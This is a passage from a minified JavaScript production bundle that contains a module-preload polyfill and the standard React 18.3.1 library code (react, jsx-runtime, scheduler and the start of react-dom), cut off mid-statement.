function u_(t,e){for(var n=0;n<e.length;n++){const i=e[n];if(typeof i!="string"&&!Array.isArray(i)){for(const s in i)if(s!=="default"&&!(s in t)){const r=Object.getOwnPropertyDescriptor(i,s);r&&Object.defineProperty(t,s,r.get?r:{enumerable:!0,get:()=>i[s]})}}}return Object.freeze(Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}))}(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const s of document.querySelectorAll('link[rel="modulepreload"]'))i(s);new MutationObserver(s=>{for(const r of s)if(r.type==="childList")for(const a of r.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&i(a)}).observe(document,{childList:!0,subtree:!0});function n(s){const r={};return s.integrity&&(r.integrity=s.integrity),s.referrerPolicy&&(r.referrerPolicy=s.referrerPolicy),s.crossOrigin==="use-credentials"?r.credentials="include":s.crossOrigin==="anonymous"?r.credentials="omit":r.credentials="same-origin",r}function i(s){if(s.ep)return;s.ep=!0;const r=n(s);fetch(s.href,r)}})();function d_(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}var Wm={exports:{}},Ol={},jm={exports:{}},Ve={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Xa=Symbol.for("react.element"),p_=Symbol.for("react.portal"),h_=Symbol.for("react.fragment"),f_=Symbol.for("react.strict_mode"),m_=Symbol.for("react.profiler"),g_=Symbol.for("react.provider"),v_=Symbol.for("react.context"),__=Symbol.for("react.forward_ref"),x_=Symbol.for("react.suspense"),y_=Symbol.for("react.memo"),S_=Symbol.for("react.lazy"),wh=Symbol.iterator;function b_(t){return t===null||typeof t!="object"?null:(t=wh&&t[wh]||t["@@iterator"],typeof t=="function"?t:null)}var Xm={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},qm=Object.assign,Ym={};function Or(t,e,n){this.props=t,this.context=e,this.refs=Ym,this.updater=n||Xm}Or.prototype.isReactComponent={};Or.prototype.setState=function(t,e){if(typeof t!="object"&&typeof t!="function"&&t!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,t,e,"setState")};Or.prototype.forceUpdate=function(t){this.updater.enqueueForceUpdate(this,t,"forceUpdate")};function $m(){}$m.prototype=Or.prototype;function np(t,e,n){this.props=t,this.context=e,this.refs=Ym,this.updater=n||Xm}var ip=np.prototype=new $m;ip.constructor=np;qm(ip,Or.prototype);ip.isPureReactComponent=!0;var Eh=Array.isArray,Km=Object.prototype.hasOwnProperty,sp={current:null},Zm={key:!0,ref:!0,__self:!0,__source:!0};function Jm(t,e,n){var i,s={},r=null,a=null;if(e!=null)for(i in e.ref!==void 0&&(a=e.ref),e.key!==void 0&&(r=""+e.key),e)Km.call(e,i)&&!Zm.hasOwnProperty(i)&&(s[i]=e[i]);var o=arguments.length-2;if(o===1)s.children=n;else if(1<o){for(var l=Array(o),c=0;c<o;c++)l[c]=arguments[c+2];s.children=l}if(t&&t.defaultProps)for(i in o=t.defaultProps,o)s[i]===void 0&&(s[i]=o[i]);return{$$typeof:Xa,type:t,key:r,ref:a,props:s,_owner:sp.current}}function w_(t,e){return{$$typeof:Xa,type:t.type,key:e,ref:t.ref,props:t.props,_owner:t._owner}}function rp(t){return typeof t=="object"&&t!==null&&t.$$typeof===Xa}function E_(t){var e={"=":"=0",":":"=2"};return"$"+t.replace(/[=:]/g,function(n){return e[n]})}var Mh=/\/+/g;function oc(t,e){return typeof t=="object"&&t!==null&&t.key!=null?E_(""+t.key):e.toString(36)}function Wo(t,e,n,i,s){var r=typeof t;(r==="undefined"||r==="boolean")&&(t=null);var a=!1;if(t===null)a=!0;else switch(r){case"string":case"number":a=!0;break;case"object":switch(t.$$typeof){case Xa:case p_:a=!0}}if(a)return a=t,s=s(a),t=i===""?"."+oc(a,0):i,Eh(s)?(n="",t!=null&&(n=t.replace(Mh,"$&/")+"/"),Wo(s,e,n,"",function(c){return c})):s!=null&&(rp(s)&&(s=w_(s,n+(!s.key||a&&a.key===s.key?"":(""+s.key).replace(Mh,"$&/")+"/")+t)),e.push(s)),1;if(a=0,i=i===""?".":i+":",Eh(t))for(var o=0;o<t.length;o++){r=t[o];var l=i+oc(r,o);a+=Wo(r,e,n,l,s)}else if(l=b_(t),typeof l=="function")for(t=l.call(t),o=0;!(r=t.next()).done;)r=r.value,l=i+oc(r,o++),a+=Wo(r,e,n,l,s);else if(r==="object")throw e=String(t),Error("Objects are not valid as a React child (found: "+(e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)+"). If you meant to render a collection of children, use an array instead.");return a}function ao(t,e,n){if(t==null)return t;var i=[],s=0;return Wo(t,i,"","",function(r){return e.call(n,r,s++)}),i}function M_(t){if(t._status===-1){var e=t._result;e=e(),e.then(function(n){(t._status===0||t._status===-1)&&(t._status=1,t._result=n)},function(n){(t._status===0||t._status===-1)&&(t._status=2,t._result=n)}),t._status===-1&&(t._status=0,t._result=e)}if(t._status===1)return t._result.default;throw t._result}var nn={current:null},jo={transition:null},T_={ReactCurrentDispatcher:nn,ReactCurrentBatchConfig:jo,ReactCurrentOwner:sp};function Qm(){throw Error("act(...) is not supported in production builds of React.")}Ve.Children={map:ao,forEach:function(t,e,n){ao(t,function(){e.apply(this,arguments)},n)},count:function(t){var e=0;return ao(t,function(){e++}),e},toArray:function(t){return ao(t,function(e){return e})||[]},only:function(t){if(!rp(t))throw Error("React.Children.only expected to receive a single React element child.");return t}};Ve.Component=Or;Ve.Fragment=h_;Ve.Profiler=m_;Ve.PureComponent=np;Ve.StrictMode=f_;Ve.Suspense=x_;Ve.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=T_;Ve.act=Qm;Ve.cloneElement=function(t,e,n){if(t==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+t+".");var i=qm({},t.props),s=t.key,r=t.ref,a=t._owner;if(e!=null){if(e.ref!==void 0&&(r=e.ref,a=sp.current),e.key!==void 0&&(s=""+e.key),t.type&&t.type.defaultProps)var o=t.type.defaultProps;for(l in e)Km.call(e,l)&&!Zm.hasOwnProperty(l)&&(i[l]=e[l]===void 0&&o!==void 0?o[l]:e[l])}var l=arguments.length-2;if(l===1)i.children=n;else if(1<l){o=Array(l);for(var c=0;c<l;c++)o[c]=arguments[c+2];i.children=o}return{$$typeof:Xa,type:t.type,key:s,ref:r,props:i,_owner:a}};Ve.createContext=function(t){return t={$$typeof:v_,_currentValue:t,_currentValue2:t,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},t.Provider={$$typeof:g_,_context:t},t.Consumer=t};Ve.createElement=Jm;Ve.createFactory=function(t){var e=Jm.bind(null,t);return e.type=t,e};Ve.createRef=function(){return{current:null}};Ve.forwardRef=function(t){return{$$typeof:__,render:t}};Ve.isValidElement=rp;Ve.lazy=function(t){return{$$typeof:S_,_payload:{_status:-1,_result:t},_init:M_}};Ve.memo=function(t,e){return{$$typeof:y_,type:t,compare:e===void 0?null:e}};Ve.startTransition=function(t){var e=jo.transition;jo.transition={};try{t()}finally{jo.transition=e}};Ve.unstable_act=Qm;Ve.useCallback=function(t,e){return nn.current.useCallback(t,e)};Ve.useContext=function(t){return nn.current.useContext(t)};Ve.useDebugValue=function(){};Ve.useDeferredValue=function(t){return nn.current.useDeferredValue(t)};Ve.useEffect=function(t,e){return nn.current.useEffect(t,e)};Ve.useId=function(){return nn.current.useId()};Ve.useImperativeHandle=function(t,e,n){return nn.current.useImperativeHandle(t,e,n)};Ve.useInsertionEffect=function(t,e){return nn.current.useInsertionEffect(t,e)};Ve.useLayoutEffect=function(t,e){return nn.current.useLayoutEffect(t,e)};Ve.useMemo=function(t,e){return nn.current.useMemo(t,e)};Ve.useReducer=function(t,e,n){return nn.current.useReducer(t,e,n)};Ve.useRef=function(t){return nn.current.useRef(t)};Ve.useState=function(t){return nn.current.useState(t)};Ve.useSyncExternalStore=function(t,e,n){return nn.current.useSyncExternalStore(t,e,n)};Ve.useTransition=function(){return nn.current.useTransition()};Ve.version="18.3.1";jm.exports=Ve;var Q=jm.exports;const eg=d_(Q),A_=u_({__proto__:null,default:eg},[Q]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var C_=Q,R_=Symbol.for("react.element"),P_=Symbol.for("react.fragment"),k_=Object.prototype.hasOwnProperty,L_=C_.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,N_={key:!0,ref:!0,__self:!0,__source:!0};function tg(t,e,n){var i,s={},r=null,a=null;n!==void 0&&(r=""+n),e.key!==void 0&&(r=""+e.key),e.ref!==void 0&&(a=e.ref);for(i in e)k_.call(e,i)&&!N_.hasOwnProperty(i)&&(s[i]=e[i]);if(t&&t.defaultProps)for(i in e=t.defaultProps,e)s[i]===void 0&&(s[i]=e[i]);return{$$typeof:R_,type:t,key:r,ref:a,props:s,_owner:L_.current}}Ol.Fragment=P_;Ol.jsx=tg;Ol.jsxs=tg;Wm.exports=Ol;var S=Wm.exports,ng={exports:{}},En={},ig={exports:{}},sg={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(t){function e(I,X){var K=I.length;I.push(X);e:for(;0<K;){var ne=K-1>>>1,ye=I[ne];if(0<s(ye,X))I[ne]=X,I[K]=ye,K=ne;else break e}}function n(I){return I.length===0?null:I[0]}function i(I){if(I.length===0)return null;var X=I[0],K=I.pop();if(K!==X){I[0]=K;e:for(var ne=0,ye=I.length,Le=ye>>>1;ne<Le;){var Ke=2*(ne+1)-1,Qe=I[Ke],Y=Ke+1,te=I[Y];if(0>s(Qe,K))Y<ye&&0>s(te,Qe)?(I[ne]=te,I[Y]=K,ne=Y):(I[ne]=Qe,I[Ke]=K,ne=Ke);else if(Y<ye&&0>s(te,K))I[ne]=te,I[Y]=K,ne=Y;else break e}}return X}function s(I,X){var K=I.sortIndex-X.sortIndex;return K!==0?K:I.id-X.id}if(typeof performance=="object"&&typeof performance.now=="function"){var r=performance;t.unstable_now=function(){return r.now()}}else{var a=Date,o=a.now();t.unstable_now=function(){return a.now()-o}}var l=[],c=[],p=1,d=null,h=3,f=!1,v=!1,y=!1,m=typeof setTimeout=="function"?setTimeout:null,u=typeof clearTimeout=="function"?clearTimeout:null,g=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function _(I){for(var X=n(c);X!==null;){if(X.callback===null)i(c);else if(X.startTime<=I)i(c),X.sortIndex=X.expirationTime,e(l,X);else break;X=n(c)}}function b(I){if(y=!1,_(I),!v)if(n(l)!==null)v=!0,z(T);else{var X=n(c);X!==null&&F(b,X.startTime-I)}}function T(I,X){v=!1,y&&(y=!1,u(L),L=-1),f=!0;var K=h;try{for(_(X),d=n(l);d!==null&&(!(d.expirationTime>X)||I&&!P());){var ne=d.callback;if(typeof ne=="function"){d.callback=null,h=d.priorityLevel;var ye=ne(d.expirationTime<=X);X=t.unstable_now(),typeof ye=="function"?d.callback=ye:d===n(l)&&i(l),_(X)}else i(l);d=n(l)}if(d!==null)var Le=!0;else{var Ke=n(c);Ke!==null&&F(b,Ke.startTime-X),Le=!1}return Le}finally{d=null,h=K,f=!1}}var A=!1,C=null,L=-1,w=5,E=-1;function P(){return!(t.unstable_now()-E<w)}function G(){if(C!==null){var I=t.unstable_now();E=I;var X=!0;try{X=C(!0,I)}finally{X?V():(A=!1,C=null)}}else A=!1}var V;if(typeof g=="function")V=function(){g(G)};else if(typeof MessageChannel<"u"){var Z=new MessageChannel,O=Z.port2;Z.port1.onmessage=G,V=function(){O.postMessage(null)}}else V=function(){m(G,0)};function z(I){C=I,A||(A=!0,V())}function F(I,X){L=m(function(){I(t.unstable_now())},X)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(I){I.callback=null},t.unstable_continueExecution=function(){v||f||(v=!0,z(T))},t.unstable_forceFrameRate=function(I){0>I||125<I?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):w=0<I?Math.floor(1e3/I):5},t.unstable_getCurrentPriorityLevel=function(){return h},t.unstable_getFirstCallbackNode=function(){return n(l)},t.unstable_next=function(I){switch(h){case 1:case 2:case 3:var X=3;break;default:X=h}var K=h;h=X;try{return I()}finally{h=K}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=function(){},t.unstable_runWithPriority=function(I,X){switch(I){case 1:case 2:case 3:case 4:case 5:break;default:I=3}var K=h;h=I;try{return X()}finally{h=K}},t.unstable_scheduleCallback=function(I,X,K){var ne=t.unstable_now();switch(typeof K=="object"&&K!==null?(K=K.delay,K=typeof K=="number"&&0<K?ne+K:ne):K=ne,I){case 1:var ye=-1;break;case 2:ye=250;break;case 5:ye=1073741823;break;case 4:ye=1e4;break;default:ye=5e3}return ye=K+ye,I={id:p++,callback:X,priorityLevel:I,startTime:K,expirationTime:ye,sortIndex:-1},K>ne?(I.sortIndex=K,e(c,I),n(l)===null&&I===n(c)&&(y?(u(L),L=-1):y=!0,F(b,K-ne))):(I.sortIndex=ye,e(l,I),v||f||(v=!0,z(T))),I},t.unstable_shouldYield=P,t.unstable_wrapCallback=function(I){var X=h;return function(){var K=h;h=X;try{return I.apply(this,arguments)}finally{h=K}}}})(sg);ig.exports=sg;var I_=ig.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var D_=Q,wn=I_;function se(t){for(var e="https://reactjs.org/docs/error-decoder.html?invariant="+t,n=1;n<arguments.length;n++)e+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+t+"; visit "+e+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var rg=new Set,Sa={};function Bs(t,e){Mr(t,e),Mr(t+"Capture",e)}function Mr(t,e){for(Sa[t]=e,t=0;t<e.length;t++)rg.add(e[t])}var Ai=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),hu=Object.prototype.hasOwnProperty,U_=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Th={},Ah={};function O_(t){return hu.call(Ah,t)?!0:hu.call(Th,t)?!1:U_.test(t)?Ah[t]=!0:(Th[t]=!0,!1)}function F_(t,e,n,i){if(n!==null&&n.type===0)return!1;switch(typeof e){case"function":case"symbol":return!0;case"boolean":return i?!1:n!==null?!n.acceptsBooleans:(t=t.toLowerCase().slice(0,5),t!=="data-"&&t!=="aria-");default:return!1}}function B_(t,e,n,i){if(e===null||typeof e>"u"||F_(t,e,n,i))return!0;if(i)return!1;if(n!==null)switch(n.type){case 3:return!e;case 4:return e===!1;case 5:return isNaN(e);case 6:return isNaN(e)||1>e}return!1}function sn(t,e,n,i,s,r,a){this.acceptsBooleans=e===2||e===3||e===4,this.attributeName=i,this.attributeNamespace=s,this.mustUseProperty=n,this.propertyName=t,this.type=e,this.sanitizeURL=r,this.removeEmptyString=a}var Vt={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(t){Vt[t]=new sn(t,0,!1,t,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(t){var e=t[0];Vt[e]=new sn(e,1,!1,t[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(t){Vt[t]=new sn(t,2,!1,t.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(t){Vt[t]=new sn(t,2,!1,t,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(t){Vt[t]=new sn(t,3,!1,t.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(t){Vt[t]=new sn(t,3,!0,t,null,!1,!1)});["capture","download"].forEach(function(t){Vt[t]=new sn(t,4,!1,t,null,!1,!1)});["cols","rows","size","span"].forEach(function(t){Vt[t]=new sn(t,6,!1,t,null,!1,!1)});["rowSpan","start"].forEach(function(t){Vt[t]=new sn(t,5,!1,t.toLowerCase(),null,!1,!1)});var ap=/[\-:]([a-z])/g;function op(t){return t[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(t){var e=t.replace(ap,op);Vt[e]=new sn(e,1,!1,t,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(t){var e=t.replace(ap,op);Vt[e]=new sn(e,1,!1,t,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(t){var e=t.replace(ap,op);Vt[e]=new sn(e,1,!1,t,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(t){Vt[t]=new sn(t,1,!1,t.toLowerCase(),null,!1,!1)});Vt.xlinkHref=new sn("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(t){Vt[t]=new sn(t,1,!1,t.toLowerCase(),null,!0,!0)});function lp(t,e,n,i){var s=Vt.hasOwnProperty(e)?Vt[e]:null;(s!==null?s.type!==0:i||!(2<e.length)||e[0]!=="o"&&e[0]!=="O"||e[1]!=="n"&&e[1]!=="N")&&(B_(e,n,s,i)&&(n=null),i||s===null?O_(e)&&(n===null?t.removeAttribute(e):t.setAttribute(e,""+n)):s.mustUseProperty?t[s.propertyName]=n===null?s.type===3?!1:"":n:(e=s.attributeName,i=s.attributeNamespace,n===null?t.removeAttribute(e):(s=s.type,n=s===3||s===4&&n===!0?"":""+n,i?t.setAttributeNS(i,e,n):t.setAttribute(e,n))))}var Ni=D_.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,oo=Symbol.for("react.element"),sr=Symbol.for("react.portal"),rr=Symbol.for("react.fragment"),cp=Symbol.for("react.strict_mode"),fu=Symbol.for("react.profiler"),ag=Symbol.for("react.provider"),og=Symbol.for("react.context"),up=Symbol.for("react.forward_ref"),mu=Symbol.for("react.suspense"),gu=Symbol.for("react.suspense_list"),dp=Symbol.for("react.memo"),Hi=Symbol.for("react.lazy"),lg=Symbol.for("react.offscreen"),Ch=Symbol.iterator;function Wr(t){return t===null||typeof t!="object"?null:(t=Ch&&t[Ch]||t["@@iterator"],typeof t=="function"?t:null)}var vt=Object.assign,lc;function ra(t){if(lc===void 0)try{throw Error()}catch(n){var e=n.stack.trim().match(/\n( *(at )?)/);lc=e&&e[1]||""}return`
`+lc+t}var cc=!1;function uc(t,e){if(!t||cc)return"";cc=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(e)if(e=function(){throw Error()},Object.defineProperty(e.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(e,[])}catch(c){var i=c}Reflect.construct(t,[],e)}else{try{e.call()}catch(c){i=c}t.call(e.prototype)}else{try{throw Error()}catch(c){i=c}t()}}catch(c){if(c&&i&&typeof c.stack=="string"){for(var s=c.stack.split(`
`),r=i.stack.split(`
`),a=s.length-1,o=r.length-1;1<=a&&0<=o&&s[a]!==r[o];)o--;for(;1<=a&&0<=o;a--,o--)if(s[a]!==r[o]){if(a!==1||o!==1)do if(a--,o--,0>o||s[a]!==r[o]){var l=`
`+s[a].replace(" at new "," at ");return t.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",t.displayName)),l}while(1<=a&&0<=o);break}}}finally{cc=!1,Error.prepareStackTrace=n}return(t=t?t.displayName||t.name:"")?ra(t):""}function z_(t){switch(t.tag){case 5:return ra(t.type);case 16:return ra("Lazy");case 13:return ra("Suspense");case 19:return ra("SuspenseList");case 0:case 2:case 15:return t=uc(t.type,!1),t;case 11:return t=uc(t.type.render,!1),t;case 1:return t=uc(t.type,!0),t;default:return""}}function vu(t){if(t==null)return null;if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t;switch(t){case rr:return"Fragment";case sr:return"Portal";case fu:return"Profiler";case cp:return"StrictMode";case mu:return"Suspense";case gu:return"SuspenseList"}if(typeof t=="object")switch(t.$$typeof){case og:return(t.displayName||"Context")+".Consumer";case ag:return(t._context.displayName||"Context")+".Provider";case up:var e=t.render;return t=t.displayName,t||(t=e.displayName||e.name||"",t=t!==""?"ForwardRef("+t+")":"ForwardRef"),t;case dp:return e=t.displayName||null,e!==null?e:vu(t.type)||"Memo";case Hi:e=t._payload,t=t._init;try{return vu(t(e))}catch{}}return null}function V_(t){var e=t.type;switch(t.tag){case 24:return"Cache";case 9:return(e.displayName||"Context")+".Consumer";case 10:return(e._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return t=e.render,t=t.displayName||t.name||"",e.displayName||(t!==""?"ForwardRef("+t+")":"ForwardRef");case 7:return"Fragment";case 5:return e;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return vu(e);case 8:return e===cp?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e}return null}function as(t){switch(typeof t){case"boolean":case"number":case"string":case"undefined":return t;case"object":return t;default:return""}}function cg(t){var e=t.type;return(t=t.nodeName)&&t.toLowerCase()==="input"&&(e==="checkbox"||e==="radio")}function H_(t){var e=cg(t)?"checked":"value",n=Object.getOwnPropertyDescriptor(t.constructor.prototype,e),i=""+t[e];if(!t.hasOwnProperty(e)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var s=n.get,r=n.set;return Object.defineProperty(t,e,{configurable:!0,get:function(){return s.call(this)},set:function(a){i=""+a,r.call(this,a)}}),Object.defineProperty(t,e,{enumerable:n.enumerable}),{getValue:function(){return i},setValue:function(a){i=""+a},stopTracking:function(){t._valueTracker=null,delete t[e]}}}}function lo(t){t._valueTracker||(t._valueTracker=H_(t))}function ug(t){if(!t)return!1;var e=t._valueTracker;if(!e)return!0;var n=e.getValue(),i="";return t&&(i=cg(t)?t.checked?"true":"false":t.value),t=i,t!==n?(e.setValue(t),!0):!1}function ll(t){if(t=t||(typeof document<"u"?document:void 0),typeof t>"u")return null;try{return t.activeElement||t.body}catch{return t.body}}function _u(t,e){var n=e.checked;return vt({},e,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??t._wrapperState.initialChecked})}function Rh(t,e){var n=e.defaultValue==null?"":e.defaultValue,i=e.checked!=null?e.checked:e.defaultChecked;n=as(e.value!=null?e.value:n),t._wrapperState={initialChecked:i,initialValue:n,controlled:e.type==="checkbox"||e.type==="radio"?e.checked!=null:e.value!=null}}function dg(t,e){e=e.checked,e!=null&&lp(t,"checked",e,!1)}function xu(t,e){dg(t,e);var n=as(e.value),i=e.type;if(n!=null)i==="number"?(n===0&&t.value===""||t.value!=n)&&(t.value=""+n):t.value!==""+n&&(t.value=""+n);else if(i==="submit"||i==="reset"){t.removeAttribute("value");return}e.hasOwnProperty("value")?yu(t,e.type,n):e.hasOwnProperty("defaultValue")&&yu(t,e.type,as(e.defaultValue)),e.checked==null&&e.defaultChecked!=null&&(t.defaultChecked=!!e.defaultChecked)}function Ph(t,e,n){if(e.hasOwnProperty("value")||e.hasOwnProperty("defaultValue")){var i=e.type;if(!(i!=="submit"&&i!=="reset"||e.value!==void 0&&e.value!==null))return;e=""+t._wrapperState.initialValue,n||e===t.value||(t.value=e),t.defaultValue=e}n=t.name,n!==""&&(t.name=""),t.defaultChecked=!!t._wrapperState.initialChecked,n!==""&&(t.name=n)}function yu(t,e,n){(e!=="number"||ll(t.ownerDocument)!==t)&&(n==null?t.defaultValue=""+t._wrapperState.initialValue:t.defaultValue!==""+n&&(t.defaultValue=""+n))}var aa=Array.isArray;function vr(t,e,n,i){if(t=t.options,e){e={};for(var s=0;s<n.length;s++)e["$"+n[s]]=!0;for(n=0;n<t.length;n++)s=e.hasOwnProperty("$"+t[n].value),t[n].selected!==s&&(t[n].selected=s),s&&i&&(t[n].defaultSelected=!0)}else{for(n=""+as(n),e=null,s=0;s<t.length;s++){if(t[s].value===n){t[s].selected=!0,i&&(t[s].defaultSelected=!0);return}e!==null||t[s].disabled||(e=t[s])}e!==null&&(e.selected=!0)}}function Su(t,e){if(e.dangerouslySetInnerHTML!=null)throw Error(se(91));return vt({},e,{value:void 0,defaultValue:void 0,children:""+t._wrapperState.initialValue})}function kh(t,e){var n=e.value;if(n==null){if(n=e.children,e=e.defaultValue,n!=null){if(e!=null)throw Error(se(92));if(aa(n)){if(1<n.length)throw Error(se(93));n=n[0]}e=n}e==null&&(e=""),n=e}t._wrapperState={initialValue:as(n)}}function pg(t,e){var n=as(e.value),i=as(e.defaultValue);n!=null&&(n=""+n,n!==t.value&&(t.value=n),e.defaultValue==null&&t.defaultValue!==n&&(t.defaultValue=n)),i!=null&&(t.defaultValue=""+i)}function Lh(t){var e=t.textContent;e===t._wrapperState.initialValue&&e!==""&&e!==null&&(t.value=e)}function hg(t){switch(t){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function bu(t,e){return t==null||t==="http://www.w3.org/1999/xhtml"?hg(e):t==="http://www.w3.org/2000/svg"&&e==="foreignObject"?"http://www.w3.org/1999/xhtml":t}var co,fg=function(t){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(e,n,i,s){MSApp.execUnsafeLocalFunction(function(){return t(e,n,i,s)})}:t}(function(t,e){if(t.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in t)t.innerHTML=e;else{for(co=co||document.createElement("div"),co.innerHTML="<svg>"+e.valueOf().toString()+"</svg>",e=co.firstChild;t.firstChild;)t.removeChild(t.firstChild);for(;e.firstChild;)t.appendChild(e.firstChild)}});function ba(t,e){if(e){var n=t.firstChild;if(n&&n===t.lastChild&&n.nodeType===3){n.nodeValue=e;return}}t.textContent=e}var pa={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},G_=["Webkit","ms","Moz","O"];Object.keys(pa).forEach(function(t){G_.forEach(function(e){e=e+t.charAt(0).toUpperCase()+t.substring(1),pa[e]=pa[t]})});function mg(t,e,n){return e==null||typeof e=="boolean"||e===""?"":n||typeof e!="number"||e===0||pa.hasOwnProperty(t)&&pa[t]?(""+e).trim():e+"px"}function gg(t,e){t=t.style;for(var n in e)if(e.hasOwnProperty(n)){var i=n.indexOf("--")===0,s=mg(n,e[n],i);n==="float"&&(n="cssFloat"),i?t.setProperty(n,s):t[n]=s}}var 